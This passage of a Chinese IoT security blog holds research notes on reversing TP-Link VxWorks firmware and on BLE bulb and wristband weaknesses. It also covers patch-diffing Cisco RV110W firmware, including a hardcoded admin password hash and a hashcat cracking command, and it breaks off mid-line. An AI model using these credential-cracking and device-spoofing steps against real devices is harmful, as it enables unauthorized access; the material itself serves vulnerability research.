<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uImage header中：mips架构、Entry Point=0x80010000即加载基址</span></span><br><span class="line">13932         0x366C          uImage header, header size: 64 bytes, header CRC: 0x773178DD, created: 2016-05-08 14:42:48, image size: 20788 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x983BDABA, OS: Linux, CPU: MIPS, image <span class="built_in">type</span>: Firmware Image, compression <span class="built_in">type</span>: lzma, image name: <span class="string">"u-boot image"</span></span><br><span class="line"><span class="comment"># -Y中：big endian</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk -Y 36ac-2 </span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">148           0x94            MIPS executable code, 32/64-bit, big endian, at least 1250 valid instructions</span><br><span class="line"><span class="comment"># 综上：mips、大端、加载基址0x80010000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加载器只有最原始的：binary file</span></span><br><span class="line"><span class="comment"># processor选择mipsb</span></span><br><span class="line"><span class="comment"># 选中manual load，出现disassembly memory organization（或者不选，加载后就会默认打开</span></span><br><span class="line"><span class="comment"># 内存布局中：input file的loading address指定0x80010000、loading size默认就是文件大小、file offset默认0即可</span></span><br><span class="line"><span class="comment"># 选择创建rom section，address和size同input file（作用未知，但ram和rom必须选一个</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一个字节处，快捷键c将byte转化为code，随后ida会自动分析//并没有自动分析，是不是因为没有头的原因？</span></span><br></pre></td></tr></table></figure>
<ul>
<li>刚打开，啥也没有：函数为0、开头只是bytes没有具体指令、导航带全是unexpolred（（是不是需要加上之前那个header，怎么加？</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-15-050134.jpg" alt="image-20210112100328569"></p>
<ul>
<li>通过此法未找到</li>
</ul>
<h4 id="其他文章涉及"><a href="#其他文章涉及" class="headerlink" title="其他文章涉及"></a>其他文章涉及</h4><ul>
<li><p><a href="https://www.secpulse.com/archives/75635.html：在对0xA200地址之前的一些数据进行分析后可以看到一个疑似uimage" target="_blank" rel="noopener">https://www.secpulse.com/archives/75635.html：在对0xA200地址之前的一些数据进行分析后可以看到一个疑似uimage</a> header的数据段，其中有两处地址指向了0x80001000，这个地址也和很多同类路由器设备的固件加载地址相同，因此我们可以尝试使用该地址作为固件加载地址进行分析。</p>
</li>
<li><p><a href="http://www.devttys0.com/2011/07/reverse-engineering-vxworks-firmware-wrt54gv8/”，主程序的加载基址也为“80001000”" target="_blank" rel="noopener">http://www.devttys0.com/2011/07/reverse-engineering-vxworks-firmware-wrt54gv8/”，主程序的加载基址也为“80001000”</a></p>
</li>
</ul>
<h4 id="可疑点"><a href="#可疑点" class="headerlink" title="可疑点"></a>可疑点</h4><p>36ac解压前的36ac.lzma的尾部数据有“80001000”，这些结构是什么？</p>
<h4 id="vxhunter插件"><a href="#vxhunter插件" class="headerlink" title="vxhunter插件"></a>vxhunter插件</h4><p><a href="https://github.com/PAGalaxyLab/vxhunter/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/PAGalaxyLab/vxhunter/blob/master/README.zh-cn.md</a></p>
<ul>
<li>ghidra：帮助文档中，目标是vxworks的固件，实测：固件、a200均失败（Windows、script manager、manager script directory、添加vxhunter的python脚本所在目录</li>
<li>ida：文档中deme也不知道是咋用的</li>
</ul>
<h3 id="1-5-ida加载"><a href="#1-5-ida加载" class="headerlink" title="1-5-ida加载"></a>1-5-ida加载</h3><ul>
<li>加载基址0x80001000，架构mips大端<ul>
<li>并没有在boot程序36ac中找到80001000</li>
<li>36ac解压前的36ac.lzma尾部数据中有“80001000”，据文章“<a href="https://www.secpulse.com/archives/75635.html”，说是加载基址和入口点，但具体未知" target="_blank" rel="noopener">https://www.secpulse.com/archives/75635.html”，说是加载基址和入口点，但具体未知</a></li>
<li>之前也有文章“<a href="http://www.devttys0.com/2011/07/reverse-engineering-vxworks-firmware-wrt54gv8/”，主程序的加载基址也为“80001000”" target="_blank" rel="noopener">http://www.devttys0.com/2011/07/reverse-engineering-vxworks-firmware-wrt54gv8/”，主程序的加载基址也为“80001000”</a></li>
<li>36ac解压前的36ac.lzma的尾部数据有“80001000”，这些结构是什么？</li>
<li>故暂且这样吧，到底怎么确定的未知</li>
</ul>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加载器只有最原始的：binary file</span></span><br><span class="line"><span class="comment"># processor选择mipsb</span></span><br><span class="line"><span class="comment"># 选中manual load，出现disassembly memory organization（或者不选，加载后就会默认打开</span></span><br><span class="line"><span class="comment"># 内存布局中：input file的loading address指定0x80010000、loading size默认就是文件大小、file offset默认0即可</span></span><br><span class="line"><span class="comment"># 选择创建rom section，address和size同input file（作用未知，但ram和rom必须选一个</span></span><br></pre></td></tr></table></figure>
<ul>
<li>68识别出6149，而75识别出2210（75中需要手动p成函数，而68中自动识别了），why？68版np就行了</li>
<li>Imports和Exports都是空的，因为没有导入符号表</li>
</ul>
<h2 id="02-符号表文件"><a href="#02-符号表文件" class="headerlink" title="02-符号表文件"></a>02-符号表文件</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># binwalk -Me提取固件，目录中搜索vxworkx中函数，如bzero</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ <span class="built_in">cd</span> _wr886nv6.bin.extracted/</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp/_wr886nv6.bin.extracted$ grep -r bzero .</span><br><span class="line">Binary file ./C2E3A matches</span><br></pre></td></tr></table></figure>
<ul>
<li>winhex中，大量的VxWorks的函数名（00分割），推测是符号表</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-15-050140.jpg" alt="image-20210112152211065"></p>
<ul>
<li>找到函数名的起始地址头，找各个函数名的偏移（相对于大量函数名开头的偏移，而非文件开始）</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-15-50139.jpg" alt="image-20210112152819753"></p>
<ul>
<li>文件最开始处，是有规律的，前8个字节后，是某结构体数组，结构体三个成员：1字节 + 3字节 + 4字节</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-15-050135.jpg" alt="image-20210112154024425"></p>
<ul>
<li>IDA中g到4字节的地址处，恰好是函数的开头</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-15-050138.jpg" alt="image-20210112154323935"></p>
<ul>
<li>综上，结构体三个成员：1字节-类型、3字节-文件偏移、4字节-内存偏移</li>
</ul>
<h2 id="03-IDA脚本修复"><a href="#03-IDA脚本修复" class="headerlink" title="03-IDA脚本修复"></a>03-IDA脚本修复</h2><ul>
<li>根据符号表文件，获取函数名</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 有需求时再细看</span></span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"></span><br><span class="line">symfile_path = <span class="string">'./C2E3A'</span>    </span><br><span class="line">symbols_table_start = <span class="number">8</span></span><br><span class="line">strings_table_start = <span class="number">0x9d00</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(symfile_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    symfile_contents = f.read()</span><br><span class="line"></span><br><span class="line">symbols_table = symfile_contents[symbols_table_start:strings_table_start]</span><br><span class="line">strings_table = symfile_contents[strings_table_start:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_string_by_offset</span><span class="params">(offset)</span>:</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> strings_table[offset+index] != <span class="string">'\x00'</span>:</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> strings_table[offset:offset+index]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_symbols_metadata</span><span class="params">()</span>:</span></span><br><span class="line">    symbols = []</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> xrange(<span class="number">0</span>, len(symbols_table),<span class="number">8</span>):</span><br><span class="line">        symbol_item = symbols_table[offset:offset+<span class="number">8</span>]</span><br><span class="line">        flag = symbol_item[<span class="number">0</span>]</span><br><span class="line">        string_offset = int(symbol_item[<span class="number">1</span>:<span class="number">4</span>].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">        string_name = get_string_by_offset(string_offset)</span><br><span class="line">        target_address = int(symbol_item[<span class="number">-4</span>:].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">        symbols.append((flag, string_name, target_address))</span><br><span class="line">    <span class="keyword">return</span> symbols</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_symbols</span><span class="params">(symbols_meta_data)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> flag, string_name, target_address <span class="keyword">in</span> symbols_meta_data:</span><br><span class="line">        idc.MakeName(target_address, string_name)</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="string">'\x54'</span>:</span><br><span class="line">            idc.MakeCode(target_address)</span><br><span class="line">            idc.MakeFunction(target_address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    symbols_metadata = get_symbols_metadata()</span><br><span class="line">    add_symbols(symbols_metadata)</span><br></pre></td></tr></table></figure>
<ul>
<li>运行前，都是未识别的函数名</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-15-050137.jpg" alt="image-20210112154939203"></p>
<ul>
<li>运行后，解析符号表文件C2E3A，获取了函数名</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-15-050139.jpg" alt="image-20210112155059641"></p>
<h2 id="04-其他"><a href="#04-其他" class="headerlink" title="04-其他"></a>04-其他</h2><ul>
<li>uncompressed size是解压后文件的大小</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># lzma压缩的数据，uncompressed size是解压后文件的大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x36AC为52148，0xA200为2365008</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk wr886nv6.bin </span><br><span class="line">13996         0x36AC          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 52148 bytes</span><br><span class="line">41472         0xA200          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 2365008 bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># ll验证</span></span><br><span class="line"><span class="comment"># dd从firmware中提取、dd去掉尾部ff等垃圾数据、unlzma解压</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ ll</span><br><span class="line">-rw-r--r--  1 lxl lxl   52148 Jan 12 09:40 36ac-2</span><br><span class="line">-rw-r--r--  1 lxl lxl 2365008 Jan 11 17:01 a200-3</span><br></pre></td></tr></table></figure>
<ul>
<li>dd提取出待lzma解压的文件，尾部有垃圾数据（从ffff开始），这些数据是什么？</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 36ac，怀疑是解压主程序a200的boot程序</span></span><br><span class="line"><span class="comment"># 注意到有两个80 00 10 00，MyFirmware字符串</span></span><br><span class="line"><span class="comment"># 其他文章中说是：load address 和 entry point，也确实是主程序的加载基址</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ hexdump 36ac.lzma -C | tail -n 30</span><br><span class="line">000050a0  f1 2a 48 66 e5 dd 1d 11  06 2a 34 6c c8 a1 3a 7e  |.*Hf.....*4l..:~|</span><br><span class="line">000050b0  62 f7 9e ba 50 ef d1 fb  48 1f 19 c9 df 48 de bb  |b...P...H....H..|</span><br><span class="line">000050c0  07 8a 2c 82 b6 8d 4f 1f  90 94 f1 5b 29 d3 bf aa  |..,...O....[)...|</span><br><span class="line">000050d0  6e dc 84 93 5d d7 45 b2  a6 ae b0 da 5a 09 43 00  |n...].E.....Z.C.|</span><br><span class="line">000050e0  cf 45 f4 72 95 0e 4b b8  e1 <span class="built_in">cd</span> 1b 18 f6 2d 05 f6  |.E.r..K......-..|</span><br><span class="line">000050f0  29 8d 5d 0c fe 44 14 15  87 15 35 4c dc f3 86 0e  |).]..D....5L....|</span><br><span class="line">00005100  82 20 23 60 a4 66 0d 3c  ed 29 88 d6 ce d6 df 05  |. <span class="comment">#`.f.&lt;.)......|</span></span><br><span class="line">00005110  c7 94 31 a2 5e f3 52 35  0f 87 f8 88 08 1b 3f f8  |..1.^.R5......?.|</span><br><span class="line">00005120  05 30 7c 4a f3 7f be a3  ec 8e b1 55 f2 3f 65 76  |.0|J.......U.?ev|</span><br><span class="line">00005130  db 8c 59 4b ff ff ff ff  ff ff ff ff ff ff ff ff  |..YK............|</span><br><span class="line">00005140  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">*</span><br><span class="line">00006950  ff ff ff ff 00 00 01 00  55 aa 9d d1 a8 c8 83 31  |........U......1|</span><br><span class="line">00006960  c9 69 fb bf bc f0 d4 32  70 c7 aa 55 80 00 10 00  |.i.....2p..U....|<span class="comment"># 加载基址</span></span><br><span class="line">00006970  80 00 10 00 00 00 00 00  00 00 00 09 00 00 00 00  |................|</span><br><span class="line">00006980  00 02 00 00 00 02 00 00  00 00 08 00 00 02 08 00  |................|</span><br><span class="line">00006990  00 00 08 00 00 02 10 00  00 00 70 00 00 02 80 00  |..........p.....|</span><br><span class="line">000069a0  00 00 9e 00 00 03 1e 00  00 00 02 00 00 03 20 00  |.............. .|</span><br><span class="line">000069b0  00 0b 62 b2 00 0e 90 00  00 07 55 9c 00 00 00 00  |..b.......U.....|</span><br><span class="line">000069c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">000069e0  00 00 00 00 bf cc fd 9a  46 ff f6 15 <span class="built_in">cd</span> 6c 25 07  |........F....l%.|</span><br><span class="line">000069f0  51 e0 e9 b9 85 d8 28 30  f3 f8 36 b3 c5 90 11 d9  |Q.....(0..6.....|</span><br><span class="line">00006a00  58 25 c2 05 8d f8 94 d0  64 75 c4 9d 68 a4 ab 91  |X%......du..h...|</span><br><span class="line">00006a10  ee 3a 3d 72 4d 79 46 69  72 6d 77 61 72 65 00 00  |.:=rMyFirmware..|</span><br><span class="line">00006a20  00 00 00 01 5f 21 b3 de  0a 18 0d ac 96 78 6f 23  |...._!.......xo<span class="comment">#|</span></span><br><span class="line">00006a30  57 b5 ae 3f 00 00 00 00  00 00 00 00 00 00 00 00  |W..?............|</span><br><span class="line">00006a40  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00006b54</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># a200，这是主程序</span></span><br><span class="line"><span class="comment"># 注意到：MINIFS字符串</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ hexdump a200.lzma -C |tail</span><br><span class="line">000b6290  39 30 5a fb 6f 5c 65 63  97 42 d1 69 e3 13 e5 ba  |90Z.o\ec.B.i....|</span><br><span class="line">000b62a0  03 0b ba 40 fb 20 27 05  c2 c4 64 d9 fe 98 78 de  |...@. <span class="string">'...d...x.|</span></span><br><span class="line"><span class="string">000b62b0  be 68 ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |.h..............|</span></span><br><span class="line"><span class="string">000b62c0  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span></span><br><span class="line"><span class="string">*</span></span><br><span class="line"><span class="string">000b7000  4d 49 4e 49 46 53 00 00  00 00 00 00 00 00 00 00  |MINIFS..........|</span></span><br><span class="line"><span class="string">000b7010  00 00 00 02 00 00 00 86  00 01 f4 00 00 07 55 7c  |..............U||</span></span><br><span class="line"><span class="string">000b7020  92 1c 64 4e ae 88 d9 d2  2d b4 48 ce 5c eb 69 51  |..dN....-.H.\.iQ|</span></span><br><span class="line"><span class="string">000b7030  00 00 04 8d 00 00 00 20  00 00 06 c3 00 00 00 00  |....... ........|</span></span><br><span class="line"><span class="string">000b7040</span></span><br></pre></td></tr></table></figure>
<ul>
<li>问题<ul>
<li>68与75识别函数数量不同，why？</li>
<li>80001000加载基址怎么出来的？（见01-5-ida加载</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考</p>
<ul>
<li><a href="https://cq674350529.github.io/2018/09/19/TP-Link-wr886v6-固件解析/" target="_blank" rel="noopener">https://cq674350529.github.io/2018/09/19/TP-Link-wr886v6-固件解析/</a></li>
<li><a href="https://www.secpulse.com/archives/75635.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/75635.html</a></li>
</ul>
</blockquote>
<p># </p>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>固件分析</tag>
      </tags>
  </entry>
  <entry>
    <title>BLE设备的安全分析</title>
    <url>/2021/04/20/iot/BLE%E8%AE%BE%E5%A4%87%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="BLE设备的安全分析"><a href="#BLE设备的安全分析" class="headerlink" title="BLE设备的安全分析"></a>BLE设备的安全分析</h1><h2 id="BLE基础知识"><a href="#BLE基础知识" class="headerlink" title="BLE基础知识"></a>BLE基础知识</h2><ul>
<li>概要：蓝牙、BLE协议栈、Android API</li>
<li><p>专题有两个主线：BLE设备、智能门锁的安全研究</p>
</li>
<li><p>蓝牙，即Bluetooth，有两种形式</p>
<ul>
<li>传统蓝牙BR（Basic Rate），蓝牙耳机/音箱</li>
<li>低功耗蓝牙BLE（Bluetooth Low Energy），各种IoT设备，如蓝牙手环等。</li>
</ul>
</li>
<li><p>蓝牙的数据传输模型：Physical层、Logical层和L2CAP层</p>
<ul>
<li>类比OSI七层协议：发送时，高层应用将数据发送给L2CAP层，并逐层向下流动；接收时，设备从Physical层获得数据，并逐层向上流动</li>
<li>L2CAP层：高层应用中需要收发的BLE数据在此，这些数据可能在应用层中被加密，但没有被BLE协议栈加密</li>
<li>Physical层：3个广播信道和37个数据通信信道。两个BLE设备连接时，随机挑选一个广播信道进行广播，连接建立后，在37个通信信道上跳频通信</li>
<li>Logical层：完成BLE通信过程中的各种逻辑控制。BLE通信过程存在master（主动扫描并发起连接）和slave（不断发送广播并等待连接）两方，scanner-扫描状态、advertiser-广播状态。</li>
</ul>
</li>
<li><p>IoT设备需要与Android/IOS手机通信，BLE是一种常见方式</p>
</li>
<li><p>蓝牙BLE通信</p>
<ul>
<li>扫描周围的蓝牙BLE设备，并选择，API：start/stopScan</li>
<li>与设备通信，即收发数据，API：write/readCharacteristic</li>
</ul>
</li>
<li><p>相关概念</p>
<ul>
<li>每个BLE设备对应一个profile（描述设备）</li>
<li>一个profile包含多个service（设备提供的服务）</li>
<li>一个service有多个characteristic，service依靠characteristic来完成</li>
<li>Service和Characteristic各自拥有一个标识UUID，API利用UUID找到service和characteristic</li>
</ul>
</li>
</ul>
<h2 id="BLE灯泡"><a href="#BLE灯泡" class="headerlink" title="BLE灯泡"></a>BLE灯泡</h2><ul>
<li><p>概要：app日志分析获取ble通信数据、nRF conent与设备通信、不经绑定直接控制灯泡</p>
</li>
<li><p>获取BLE通信内容3法</p>
<ul>
<li>HCI Log：Android系统提供，包含蓝牙的所有日志</li>
<li>app分析：逆向app，查看其日志/Hook关键函数</li>
<li>BLE嗅探：直接嗅探周围BLE通信的数据</li>
</ul>
</li>
<li><p>app日志分析</p>
<ul>
<li>本设备较简单，app日志直接打印出BLE通信内容</li>
<li>App日志可以通过DDMS、ADB或其他工具查看，如AndroidKiller</li>
<li>多次调整亮度，对比多条日志，找异同点</li>
<li>有一个字节与亮度成线性相关</li>
</ul>
</li>
<li><p>BLE数据包格式</p>
<ul>
<li>灯泡的MAC地址</li>
<li>Service/Characteristic UUID</li>
<li>通信内容</li>
</ul>
</li>
<li><p>nRF Connect</p>
<ul>
<li>调试BLE设备的免费app，iOS/Android两个版本</li>
<li>3功能：作为master扫描周围设备、与BLE设备通信、作为Advertiser发送广播包</li>
</ul>
</li>
<li><p>nRF Connect控制灯泡</p>
<ul>
<li>通过MAC地址，找到灯泡</li>
<li>与灯泡建立BLE连接，找到Service/Characteristic的UUID</li>
<li>向Characteristic写入控制灯泡亮度的通信数据</li>
</ul>
</li>
<li><p>绑定的逻辑缺陷</p>
<ul>
<li>理想情况：每个BLE灯泡都必须完成绑定之后，才能正常使用</li>
<li>绕过：app与设备之间并没有严格的绑定关系，仅仅是app本地登记一下灯泡，单向登记并非双向绑定</li>
</ul>
</li>
</ul>
<h2 id="BLE智能手环"><a href="#BLE智能手环" class="headerlink" title="BLE智能手环"></a>BLE智能手环</h2><ul>
<li><p>概要：dongle重刷固件、伪造广播数据</p>
</li>
<li><p>手环通信方式</p>
<ul>
<li>猜测通过WiFi/4G，但并没有相关设置</li>
<li>有关于BLE通信的设置，故判断依靠BLE通信</li>
</ul>
</li>
<li><p>步数上报服务器</p>
<ul>
<li>假设1：手环不停广播，某个设备扫描附近的广播数据</li>
<li>假设2：某个设备以轮询的方式和手环建立连接、收集信息、断开连接</li>
<li>某个收集信息的设备，类似路由器，确实有“蓝牙路由器”相关产品</li>
<li>验证1：抓取手环的广播包</li>
<li>验证2：nRF connect连接手环，观察所有characteristic，看是否有可疑数据</li>
</ul>
</li>
<li><p>抓包验证1</p>
<ul>
<li>1：数据包类型为过滤条件，记录蓝牙MAC地址</li>
<li>2：换个位置，重新抓包。对比两次抓包，发现某MAC出现两次，即手环</li>
<li>3：手环MAC为过滤条件，广播数据+手环步数=广播的第9字节为步数</li>
<li>工具：sniffer+dongle，nRF connect也可</li>
</ul>
</li>
<li><p>伪造广播数据</p>
<ul>
<li>nRF connect可发送BLE广播，但受限于Android系统，不能设置MAC地址</li>
<li>需要一个自由度更高的设备，dongle可以，但需重刷固件</li>
<li>dongle固件刷写后，可伪造成手环（设置mac地址），广播自定义的步数数据</li>
</ul>
</li>
<li><p>重构工程</p>
<ul>
<li>dongle采用CC2540芯片（8051的CPU内核），故IAR For 8051作为IDE</li>
<li>芯片开发包中，找到蓝牙广播样例程序</li>
<li>调整代码，即设置广播数据，并编译工程</li>
<li>编译后，刷写dongle，覆盖其原本固件（firmware文件夹有备份）</li>
</ul>
</li>
<li><p>dongle重刷固件</p>
<ul>
<li>cc debugger连接USB dongle和pc</li>
<li>SmartRF Flash Programmer工具（sniffer同系列）</li>
<li>设置MAC地址为手环的，Location选择Secondary</li>
<li><p>Primary保存出厂MAC地址，无法更改</p>
</li>
<li><p>Secondary保存自定义MAC地址，若存在会优先使用</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：</p>
<ul>
<li><a href="https://www.4hou.com/posts/o6LY" target="_blank" rel="noopener">https://www.4hou.com/posts/o6LY</a></li>
<li><a href="https://www.4hou.com/posts/Q549" target="_blank" rel="noopener">https://www.4hou.com/posts/Q549</a></li>
<li><a href="https://www.4hou.com/posts/GQy0" target="_blank" rel="noopener">https://www.4hou.com/posts/GQy0</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>BLE协议</tag>
        <tag>智能手环</tag>
      </tags>
  </entry>
  <entry>
    <title>通过补丁对比发现Cisco RV110W的多个漏洞</title>
    <url>/2021/04/18/iot/%E9%80%9A%E8%BF%87%E8%A1%A5%E4%B8%81%E5%AF%B9%E6%AF%94%E5%8F%91%E7%8E%B0Cisco%20RV110W%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="补丁对比法对Cisco-RV110W进行固件分析"><a href="#补丁对比法对Cisco-RV110W进行固件分析" class="headerlink" title="补丁对比法对Cisco RV110W进行固件分析"></a>补丁对比法对Cisco RV110W进行固件分析</h1><h2 id="上"><a href="#上" class="headerlink" title="上"></a>上</h2><h3 id="01-diff目录"><a href="#01-diff目录" class="headerlink" title="01-diff目录"></a>01-diff目录</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 记录目录及文件信息</span></span><br><span class="line"><span class="built_in">cd</span> _RV110W_FW_1.2.2.8.bin.extracted/squashfs-root</span><br><span class="line">find . -<span class="built_in">type</span> f -<span class="built_in">print</span> | sort -u | xargs md5sum &gt; /tmp/1.2.2.8.md5</span><br><span class="line"><span class="built_in">cd</span> _RV110W_FW_1.2.2.5.bin.extracted/squashfs-root</span><br><span class="line">find . -<span class="built_in">type</span> f -<span class="built_in">print</span> | sort -u | xargs md5sum &gt; /tmp/1.2.2.5.md5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令解读：find . -type f -print | sort -u | xargs md5sum **&gt;** /tmp/1.2.2.8.md5</span></span><br><span class="line">- -<span class="built_in">print</span>：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式为每列一个名称，每个名称前皆有“./”字符串；</span><br><span class="line">- sort排序，-u 意味着是唯一的(unique)，输出的结果是去完重了的。</span><br><span class="line">- `xargs`命令的作用，是将标准输入转为命令行参数，如$ <span class="built_in">echo</span> <span class="string">"hello world"</span> | xargs <span class="built_in">echo</span>（本可以用｜管道符，但大多数命令都不接受标准输入作为参数，如<span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># diff以逐行的方式，比较文本文件的异同处</span></span><br><span class="line">diff /tmp/1.2.2.8.md5 /tmp/1.2.2.5.md5</span><br></pre></td></tr></table></figure>
<ul>
<li>读懂diff结果：<a href="http://www.ruanyifeng.com/blog/2012/08/how_to_read_diff.html，举例：4c、\" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2012/08/how_to_read_diff.html，举例：4c、\</a>&lt; a、-–、> b<ul>
<li>4c4：它分成三个部分：前面的”4”，表示f1的第4行有变化；中间的”c”表示变动的模式是内容改变（change），其他模式还有”增加”（a，代表addition）和”删除”（d，代表deletion）；后面的”4”，表示变动后变成f2的第4行。</li>
<li>&lt; a：前面的小于号，表示要从f1当中去除该行（也就是第4行），后面的”a”表示该行的内容。</li>
<li>> b：前面的大于号表示f2增加了该行，后面的”b”表示该行的内容。</li>
<li>也就表示，第4行有修改，旧文件第四行删掉a，又在第四行增加b</li>
</ul>
</li>
</ul>
<ul>
<li><p>316d316、&lt; d9a523641b71ff29baf20be8fcaced0c  ./usr/sbin/utelnetd</p>
<ul>
<li>删除了316行，删除了<em>utelnetd</em>二进制文件</li>
<li>It makes sense given that this service can’t be enabled from the web UI. Probably an artifact left from internal testing.</li>
<li>新版本删掉它是合理的，因为无法从web界面启动它，可能当时为了测试留下的</li>
</ul>
</li>
</ul>
<h3 id="02-utelnetd"><a href="#02-utelnetd" class="headerlink" title="02-utelnetd"></a>02-utelnetd</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Anyway, *utelnetd* - like any good unix tool - rely on */bin/login* to authenticate users. It’s a built-in binary that uses */etc/shadow* to authenticate users. The shadow file is absent from the firmware squashfs file system so it must be generated when the device boots up.</span><br></pre></td></tr></table></figure>
<ul>
<li><em>utelnetd</em>像其他Unix工具一样，都依靠<em>/ bin / login</em>来进行用户认证</li>
<li><em>/ bin / login</em>是一个内置的二进制文件，使用<em>/ etc / shadow</em>对用户进行身份验证。</li>
<li>固件squashfs文件系统中没有shadow文件，因此必须在设备启动时生成该shadow文件。</li>
</ul>
<h3 id="03-获取hash"><a href="#03-获取hash" class="headerlink" title="03-获取hash"></a>03-获取hash</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 哪里引用shadow</span></span><br><span class="line"><span class="comment"># （-r递归、当前目录下所有文件、搜内容</span></span><br><span class="line"><span class="comment"># （/sbin/rc在Linux初始化过程中执行</span></span><br><span class="line">grep <span class="string">'etc/shadow'</span> . -r</span><br><span class="line">Binary file ./squashfs-root/bin/busybox matches</span><br><span class="line">Binary file ./squashfs-root/sbin/rc matches</span><br><span class="line">Binary file ./squashfs-root/lib/libc.so.0 matches</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定文件中搜字符串</span></span><br><span class="line"><span class="comment"># （静态默认凭据属于admin用户</span></span><br><span class="line"><span class="comment"># （只有该密码的md5crypt 哈希值</span></span><br><span class="line">strings ./squashfs-root/sbin/rc | grep shadow</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'admin:$1$aUzX1IiE$x2rSbqyggRaYAJgSRJ9uC.:15880:0:99999:7:::'</span> &gt; /etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># hash解密</span></span><br><span class="line"><span class="comment"># （直接在线解密：https://www.somd5.com，也能得到</span></span><br><span class="line"><span class="comment"># （未探究hashcat用法</span></span><br><span class="line">hashcat -O -w 4 --status -m 500 /tmp/rv110.txt /tmp/rockyou.txt -r /tmp/InsidePro-PasswordsPro.rule  --show</span><br><span class="line"><span class="variable">$1</span><span class="variable">$aUzX1IiE</span><span 